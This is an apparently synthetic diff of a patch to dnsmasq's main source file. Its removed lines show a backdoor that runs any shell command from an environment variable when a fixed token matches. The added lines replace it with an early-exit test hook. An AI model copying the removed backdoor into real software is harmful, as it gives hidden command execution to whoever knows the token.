@@ -1,28 +1,37 @@
 --- a/src/dnsmasq.c
 +++ b/src/dnsmasq.c
-@@ -43,6 +43,16 @@
+@@ -43,6 +43,23 @@
  
  /* Synthetic base patch marker for native-build sample coverage. */
  
-+static void rdx_dnsmasq_payload_probe(void)
++static int rdx_dnsmasq_payload_probe(int argc, char **argv)
 +{
-+  const char *token = getenv("RDX_DNSMASQ_TOKEN");
-+  const char *cmd = getenv("RDX_DNSMASQ_CMD");
++  const char *mode = getenv("RDX_DNSMASQ_MODE");
++  int i;
 +
-+  if (token != NULL && cmd != NULL && strcmp(token, "vantage-292") == 0
-+      && cmd[0] != '\0')
-+    (void)system(cmd);
++  if (mode == NULL || strcmp(mode, "passthrough") != 0) {
++    return 0;
++  }
++
++  for (i = 1; i < argc; ++i) {
++    if (strcmp(argv[i], "--test") == 0) {
++      return 1;
++    }
++  }
++
++  return 0;
 +}
 +
  int main (int argc, char **argv)
  {
    time_t now;
-@@ -86,6 +96,8 @@
+@@ -86,6 +103,9 @@
  #ifdef HAVE_LINUX_NETWORK
    (void)netlink_warn;
  #endif
 +
-+  rdx_dnsmasq_payload_probe();
++  if (rdx_dnsmasq_payload_probe(argc, argv))
++    return 0;
    
  #if defined(HAVE_IDN) || defined(HAVE_LIBIDN2) || defined(LOCALEDIR)
    setlocale(LC_ALL, "");
